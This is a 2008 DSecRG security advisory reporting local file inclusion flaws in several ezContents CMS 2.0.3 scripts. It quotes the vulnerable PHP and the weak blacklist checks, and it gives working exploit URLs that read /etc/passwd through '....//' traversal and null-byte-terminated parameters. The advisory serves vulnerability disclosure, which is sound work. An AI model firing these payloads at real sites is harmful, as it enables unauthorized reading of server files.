<html><head><title>ezContents CMS 2.0.3 Multiple Local File Inclusion Vulnerabilities</title></head><pre>Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-038


Application:                    ezContents CMS
Versions Affected:              2.0.3
Application URL:                http://www.ezcontents.org/
Vendor URL:                     http://www.visualshapers.com/
Bug:                            Multiple Local File Include
Exploits:                       YES
Reported:                       05.08.2008
Second report:                  18.08.2008
Vendor Response:                NONE
Solution:                       NONE
Date of Public Advisory:        25.08.2008
Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)



Description
***********

ezContents CMS has Multiple Local File Include vulnerabilities. 



Details
*******

1. Local File Include vulnerability found in script /module.php

Vulnerable GET parameter &quot;link&quot;.

First discovered by Zero_X [http://secunia.com/advisories/10604/].
Vendor fixed vulnerability in version 2.0.3 by adding verification for this parameter. 
However, attacker still can include local files.

Code [line 32-42, 141-145]
--------------------------
#################################################

$GLOBALS[&quot;rootdp&quot;] = './';
require_once ($GLOBALS[&quot;rootdp&quot;].&quot;include/config.php&quot;);
require_once ($GLOBALS[&quot;rootdp&quot;].&quot;include/db.php&quot;);
require_once ($GLOBALS[&quot;rootdp&quot;].&quot;include/session.php&quot;);
include_once ($GLOBALS[&quot;rootdp&quot;].$GLOBALS[&quot;modules_home&quot;].&quot;modfunctions.php&quot;);


if ((!isset($HTTP_GET_VARS[&quot;ezSID&quot;])) &amp;&amp; (isset($HTTP_POST_VARS[&quot;ezSID&quot;]))) $HTTP_GET_VARS[&quot;ezSID&quot;] = $HTTP_POST_VARS[&quot;ezSID&quot;];
if ((!isset($HTTP_GET_VARS[&quot;link&quot;])) &amp;&amp; (isset($HTTP_POST_VARS[&quot;link&quot;])))  $HTTP_GET_VARS[&quot;link&quot;] = $HTTP_POST_VARS[&quot;link&quot;];

$HTTP_GET_VARS[&quot;link&quot;] = str_replace('../', '', $HTTP_GET_VARS[&quot;link&quot;]);

...

if (isExternalLink ($HTTP_GET_VARS[&quot;link&quot;])) {
        ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
} else {
        include($GLOBALS[&quot;rootdp&quot;].$HTTP_GET_VARS[&quot;link&quot;]);
}

#################################################

isExternalLink() function in script /include/functions.php checks for remote inclusion attempts.  

Code [line 768-779]
-------------------
#################################################

function isExternalLink ($linkref)
{
        if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||
                 (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||
                 (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||
                 (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||
                 (substr($linkref,0,5) == 'wais:') ) {
                 return True;
        } else {
                 return False;
        }
} // isExternalLink

#################################################

Example:

http://[server]/[installdir]/module.php?link=....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd


2. Local File Include vulnerabilities found in scripts

/modules/diary/showdiary.php
/modules/diary/showeventlist.php
/modules/gallery/showgallery.php
/modules/reviews/showreviews.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code [showdiary.php, line 32-45]
--------------------------------
#################################################

global $HTTP_SERVER_VARS;
if ( (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-11) == 'control.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-10) == 'module.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-16) == 'showcontents.php') ) {
         require_once('./modules/moduleSec.php');
} else {
        require_once('../moduleSec.php');
}

$GLOBALS[&quot;ModuleName&quot;] = 'diary';

if (!isset($GLOBALS[&quot;gsLanguage&quot;])) { Header(&quot;Location: &quot;.$GLOBALS[&quot;rootdp&quot;].&quot;module.php?link=&quot;.$GLOBALS[&quot;modules_home&quot;].$GLOBALS[&quot;ModuleRef&quot;].&quot;/showdiary.php&quot;); }
include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_admin.php&quot;);
include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_main.php&quot;);

#################################################

Script /modules/moduleSec.php checks for inclusion attempts.

Code
----
#################################################

function moduleExternalLink ($linkref)
{
        if ($linkref != '') {
                if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||
                         (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||
                         (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||
                         (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||
                         (substr($linkref,0,5) == 'wais:') ) {
                         return True;
                } else {
                        return False;
                }
        } else {
                return False;
        }
} // moduleExternalLink


if (!(isset($GLOBALS[&quot;rootdp&quot;]))) {
         ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
         DIE;
}
if ( (moduleExternalLink($GLOBALS[&quot;rootdp&quot;])) || (moduleExternalLink($GLOBALS[&quot;modfiledir&quot;])) ||
         (moduleExternalLink($GLOBALS[&quot;modules_home&quot;])) || (moduleExternalLink($GLOBALS[&quot;admin_home&quot;])) ||
         (moduleExternalLink($GLOBALS[&quot;language_home&quot;])) ) {
         ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
         DIE;
}

#################################################

Example:

http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&amp;gsLanguage=../../../../../../../../../../../../../etc/passwd%00
http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&amp;gsLanguage=DSecRG&amp;language_home=../../../../../../../../../../../../../etc/passwd%00


3. Local File Include vulnerabilities found in scripts

/modules/diary/showdiarydetail.php
/modules/gallery/showgallerydetails.php
/modules/reviews/showreviewsdetails.php
/modules/news/shownewsdetails.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code [showdiarydetail.php, line 32-46]
--------------------------------------
#################################################

global $HTTP_SERVER_VARS;
if ( (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-11) == 'control.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-10) == 'module.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-16) == 'showcontents.php') ) {
         require_once('./modules/moduleSec.php');
} else {
        require_once('../moduleSec.php');
}

$GLOBALS[&quot;ModuleName&quot;] = 'diary';

include_once ($GLOBALS[&quot;admin_home&quot;].&quot;compile.php&quot;);

include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_admin.php&quot;);
include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_main.php&quot;);

#################################################

Example:

http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&amp;admin_home=../../../../../../../../../../../../../etc/passwd%00
http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&amp;gsLanguage=../../../../../../../../../../../../../etc/passwd%00
http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&amp;language_home=../../../../../../../../../../../../../etc/passwd%00


4. Local File Include vulnerabilities found in scripts

/modules/diary/submit_diary.php
/modules/gallery/submit_gallery.php
/modules/guestbook/submit_guestbook.php
/modules/reviews/submit_reviews.php
/modules/news/submit_news.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code [submit_diary.php, line 32-51]
-----------------------------------
#################################################

global $HTTP_SERVER_VARS;
if ( (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-11) == 'control.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-10) == 'module.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-16) == 'showcontents.php') ) {
         require_once('./modules/moduleSec.php');
} else {
        require_once('../moduleSec.php');
}

// Localisation variables (used for default values)
// Change these to suit your site preferences
//
$expiryperiod = 'm';                    // Time period to calculate the banner expiry date (based on today's date)
$expirynumber = 1;


$GLOBALS[&quot;ModuleName&quot;] = 'diary';

include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_admin.php&quot;);
include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_main.php&quot;);

#################################################

Example:

http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&amp;gsLanguage=../../../../../../../../../../../../../etc/passwd%00
http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&amp;language_home=../../../../../../../../../../../../../etc/passwd%00


5. Local File Include vulnerabilities found in scripts

/modules/news/archivednews_summary.php
/modules/news/news_summary.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code [news_summary.php, line 32-41]
-----------------------------------
#################################################

global $HTTP_SERVER_VARS;
if ( (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-11) == 'control.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-10) == 'module.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-16) == 'showcontents.php') ) {
         require_once('./modules/moduleSec.php');
} else {
        require_once('../moduleSec.php');
}

include_once ($GLOBALS[&quot;admin_home&quot;].&quot;compile.php&quot;);

#################################################

Example:

http://[server]/[installdir]/modules/news/news_summary.php?rootdp=DSecRG&amp;admin_home=../../../../../../../../../../../../../etc/passwd%00


6. Local File Include vulnerabilities found in scripts

/modules/diary/inlineeventlist.php
/modules/news/inlinenews.php

Successful exploitation requires that &quot;register_globals&quot; is enabled.

Code [inlinenews.php, line 32-52]
---------------------------------
#################################################

global $HTTP_SERVER_VARS;
if ( (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-11) == 'control.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-10) == 'module.php') ||
         (substr($HTTP_SERVER_VARS[&quot;PHP_SELF&quot;],-16) == 'showcontents.php') ) {
         require_once('./modules/moduleSec.php');
} else {
        require_once('../moduleSec.php');
}

global $EZ_SESSION_VARS;

$GLOBALS[&quot;ModuleName&quot;] = 'news';

$linkref = $nLink;
$chainlink = explode('/',$linkref);
$modfilename = array_pop($chainlink);
$GLOBALS[&quot;modfiledir&quot;] = implode('/',$chainlink);
include($GLOBALS[&quot;modfiledir&quot;].&quot;/moduleref.php&quot;);

include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_admin.php&quot;);
include_once ($GLOBALS[&quot;language_home&quot;].$GLOBALS[&quot;gsLanguage&quot;].&quot;/lang_main.php&quot;);

#################################################

Example:

http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&amp;nLink=../../../../../../../../../../../../../etc/passwd%00/
http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&amp;gsLanguage=../../../../../../../../../../../../../etc/passwd%00
http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&amp;language_home=../../../../../../../../../../../../../etc/passwd%00



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:    research [at] dsec [dot] ru
            http://www.dsec.ru (in Russian)

# milw0rm.com [2008-08-25]</pre></html>